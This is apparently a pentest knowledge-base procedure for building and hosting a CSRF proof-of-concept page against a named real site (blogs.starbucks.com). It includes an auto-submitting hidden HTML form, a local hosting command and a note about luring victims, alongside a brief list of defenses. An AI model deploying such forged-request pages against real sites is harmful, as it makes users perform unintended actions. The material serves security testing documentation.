---
tags:
  - csrf
  - poc
  - web
  - html
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:27:22.487Z'
sub_techniques: []
id: 7ea1a88b-b83b-4c17-aaef-55737dea0baf
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Create and Host CSRF Proof-of-Concept Page

## Summary

This procedure builds and deploys an HTML page that automatically submits a forged request to a vulnerable CSRF endpoint, demonstrating exploitation potential.

## Description

For sites like blogs.starbucks.com, create a form replicating the comment submission, hidden and auto-submitted via JavaScript. Host on an attacker-controlled server. Targets web browsers; requires captured form details. Outcome: Malicious page ready for victim luring, posting arbitrary comments.

## Requirements

1. Captured form parameters (e.g., __VIEWSTATE)
2. Local hosting capability (e.g., Python server)
3. Public URL for the PoC (e.g., via ngrok if needed)

## Defense

Defensive measures and detection strategies:

- Validate referer/origin headers
- Educate users on phishing links
- Scan for auto-submitting forms in web traffic

## Objectives

1. Replicate vulnerable form in HTML
2. Enable auto-submission on page load
3. Host accessibly for testing

## Instructions

### Step 1: Craft HTML Form

**Context**: Build the form with hidden fields matching the target.

Create starg.html with action set to the endpoint, hidden inputs for __VIEWSTATE, tbComment='qwqw', etc., and <script> to submit on load.

```html
<!DOCTYPE html>
<html><body>
<form id="csrf-form" action="https://blogs.starbucks.com/..." method="POST">
<input type="hidden" name="__VIEWSTATE" value="[VALUE]" />
<input type="hidden" name="tbComment" value="qwqw" />
</form>
<script>document.getElementById('csrf-form').submit();</script>
</body></html>
```

**Expected Output**: Valid HTML file ready for hosting.

### Step 2: Host the Page

**Context**: Serve the file from a cross-origin domain.

Run `python -m http.server 8000` in the directory, access via http://localhost:8000/starg.html. For public access, use a hosting service.

**Expected Output**: Page loads and auto-submits when visited.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[csrf]]
- [[poc]]
- [[web]]
